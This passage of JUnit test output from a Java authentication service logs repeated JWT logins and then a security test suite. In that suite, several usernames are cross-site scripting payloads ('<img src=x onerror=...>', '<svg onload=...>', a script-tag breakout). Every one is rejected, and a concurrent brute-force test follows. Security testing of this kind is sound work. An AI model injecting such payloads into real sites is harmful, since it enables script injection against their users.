17:10:24.484 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:24.485 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:24.485 [http-nio-auto-4-exec-6] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:24.493 [http-nio-auto-4-exec-7] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:24.494 [http-nio-auto-4-exec-7] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:24.758 [http-nio-auto-4-exec-7] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:24.760 [http-nio-auto-4-exec-7] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:24.760 [http-nio-auto-4-exec-7] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:24 MST 2025, expiration: Wed Jul 02 18:10:24 MST 2025
17:10:24.761 [http-nio-auto-4-exec-7] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:24.763 [http-nio-auto-4-exec-7] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:24.763 [http-nio-auto-4-exec-7] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:24.770 [http-nio-auto-4-exec-8] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:24.772 [http-nio-auto-4-exec-8] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:25.040 [http-nio-auto-4-exec-8] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:25.042 [http-nio-auto-4-exec-8] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:25.043 [http-nio-auto-4-exec-8] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:25 MST 2025, expiration: Wed Jul 02 18:10:25 MST 2025
17:10:25.045 [http-nio-auto-4-exec-8] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:25.046 [http-nio-auto-4-exec-8] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:25.046 [http-nio-auto-4-exec-8] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:25.054 [http-nio-auto-4-exec-9] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:25.055 [http-nio-auto-4-exec-9] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:25.314 [http-nio-auto-4-exec-9] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:25.316 [http-nio-auto-4-exec-9] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:25.317 [http-nio-auto-4-exec-9] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:25 MST 2025, expiration: Wed Jul 02 18:10:25 MST 2025
17:10:25.318 [http-nio-auto-4-exec-9] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:25.320 [http-nio-auto-4-exec-9] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:25.320 [http-nio-auto-4-exec-9] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:25.327 [http-nio-auto-4-exec-10] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:25.329 [http-nio-auto-4-exec-10] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:25.588 [http-nio-auto-4-exec-10] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:25.590 [http-nio-auto-4-exec-10] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:25.590 [http-nio-auto-4-exec-10] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:25 MST 2025, expiration: Wed Jul 02 18:10:25 MST 2025
17:10:25.592 [http-nio-auto-4-exec-10] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:25.593 [http-nio-auto-4-exec-10] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:25.594 [http-nio-auto-4-exec-10] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:25.601 [http-nio-auto-4-exec-1] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:25.602 [http-nio-auto-4-exec-1] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:25.862 [http-nio-auto-4-exec-1] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:25.865 [http-nio-auto-4-exec-1] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:25.865 [http-nio-auto-4-exec-1] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:25 MST 2025, expiration: Wed Jul 02 18:10:25 MST 2025
17:10:25.866 [http-nio-auto-4-exec-1] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:25.868 [http-nio-auto-4-exec-1] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:25.868 [http-nio-auto-4-exec-1] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:25.875 [http-nio-auto-4-exec-2] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:25.879 [http-nio-auto-4-exec-2] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:26.145 [http-nio-auto-4-exec-2] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:26.148 [http-nio-auto-4-exec-2] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:26.148 [http-nio-auto-4-exec-2] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:26 MST 2025, expiration: Wed Jul 02 18:10:26 MST 2025
17:10:26.149 [http-nio-auto-4-exec-2] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:26.151 [http-nio-auto-4-exec-2] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:26.151 [http-nio-auto-4-exec-2] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:26.159 [http-nio-auto-4-exec-3] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:26.160 [http-nio-auto-4-exec-3] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:26.418 [http-nio-auto-4-exec-3] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:26.420 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:26.420 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:26 MST 2025, expiration: Wed Jul 02 18:10:26 MST 2025
17:10:26.422 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:26.423 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:26.424 [http-nio-auto-4-exec-3] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:26.430 [http-nio-auto-4-exec-4] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:26.431 [http-nio-auto-4-exec-4] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:26.692 [http-nio-auto-4-exec-4] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:26.695 [http-nio-auto-4-exec-4] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:26.695 [http-nio-auto-4-exec-4] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:26 MST 2025, expiration: Wed Jul 02 18:10:26 MST 2025
17:10:26.697 [http-nio-auto-4-exec-4] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:26.698 [http-nio-auto-4-exec-4] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:26.698 [http-nio-auto-4-exec-4] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:26.705 [http-nio-auto-4-exec-5] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:26.706 [http-nio-auto-4-exec-5] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:26.967 [http-nio-auto-4-exec-5] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:26.969 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:26.969 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:26 MST 2025, expiration: Wed Jul 02 18:10:26 MST 2025
17:10:26.971 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:26.972 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:26.972 [http-nio-auto-4-exec-5] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:26.980 [http-nio-auto-4-exec-6] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:26.981 [http-nio-auto-4-exec-6] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:27.246 [http-nio-auto-4-exec-6] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:27.248 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
[...]
17:10:36.447 [http-nio-auto-4-exec-9] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: <img src=x onerror=alert('XSS')>
17:10:36.448 [http-nio-auto-4-exec-9] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.450 [http-nio-auto-4-exec-9] WARN  m.c.q.seguridad.service.AuthService - Usuario no encontrado o inactivo: <img src=x onerror=alert('XSS')>
17:10:36.450 [http-nio-auto-4-exec-9] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario <img src=x onerror=alert('XSS')>: Credenciales inválidas
17:10:36.459 [http-nio-auto-4-exec-10] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: javascript:alert('XSS')
17:10:36.461 [http-nio-auto-4-exec-10] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.463 [http-nio-auto-4-exec-10] WARN  m.c.q.seguridad.service.AuthService - Usuario no encontrado o inactivo: javascript:alert('XSS')
17:10:36.463 [http-nio-auto-4-exec-10] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario javascript:alert('XSS'): Credenciales inválidas
17:10:36.474 [http-nio-auto-4-exec-1] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: <svg onload=alert('XSS')>
17:10:36.476 [http-nio-auto-4-exec-1] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.479 [http-nio-auto-4-exec-1] WARN  m.c.q.seguridad.service.AuthService - Usuario no encontrado o inactivo: <svg onload=alert('XSS')>
17:10:36.479 [http-nio-auto-4-exec-1] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario <svg onload=alert('XSS')>: Credenciales inválidas
17:10:36.491 [http-nio-auto-4-exec-2] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: '"><script>alert('XSS')</script>
17:10:36.493 [http-nio-auto-4-exec-2] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.495 [http-nio-auto-4-exec-2] WARN  m.c.q.seguridad.service.AuthService - Usuario no encontrado o inactivo: '"><script>alert('XSS')</script>
17:10:36.496 [http-nio-auto-4-exec-2] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario '"><script>alert('XSS')</script>: Credenciales inválidas
]]></system-out>
  </testcase>
  <testcase name="shouldHandleConcurrentBruteForceAttacks" classname="mx.com.qtx.seguridad.security.SecurityAttackProtectionTest" time="1.267">
    <system-out><![CDATA[17:10:36.529 [http-nio-auto-4-exec-3] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:36.532 [http-nio-auto-4-exec-3] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.535 [http-nio-auto-4-exec-7] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:36.538 [http-nio-auto-4-exec-6] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:36.538 [http-nio-auto-4-exec-8] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:36.540 [http-nio-auto-4-exec-6] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.541 [http-nio-auto-4-exec-8] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.543 [http-nio-auto-4-exec-4] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:36.544 [http-nio-auto-4-exec-4] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.546 [http-nio-auto-4-exec-7] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.557 [http-nio-auto-4-exec-1] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:36.558 [http-nio-auto-4-exec-1] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.602 [http-nio-auto-4-exec-10] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:36.604 [http-nio-auto-4-exec-10] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.656 [http-nio-auto-4-exec-2] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:36.659 [http-nio-auto-4-exec-2] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.708 [http-nio-auto-4-exec-9] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:36.710 [http-nio-auto-4-exec-9] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.760 [http-nio-auto-4-exec-5] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:36.762 [http-nio-auto-4-exec-5] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.850 [http-nio-auto-4-exec-3] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:36.851 [http-nio-auto-4-exec-3] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:36.866 [http-nio-auto-4-exec-8] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:36.866 [http-nio-auto-4-exec-8] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:36.867 [http-nio-auto-4-exec-3] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:36.868 [http-nio-auto-4-exec-3] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.869 [http-nio-auto-4-exec-7] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:36.869 [http-nio-auto-4-exec-6] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:36.870 [http-nio-auto-4-exec-7] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:36.870 [http-nio-auto-4-exec-6] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:36.872 [http-nio-auto-4-exec-1] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:36.873 [http-nio-auto-4-exec-1] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:36.879 [http-nio-auto-4-exec-6] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:36.879 [http-nio-auto-4-exec-4] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:36.880 [http-nio-auto-4-exec-4] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:36.881 [http-nio-auto-4-exec-6] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
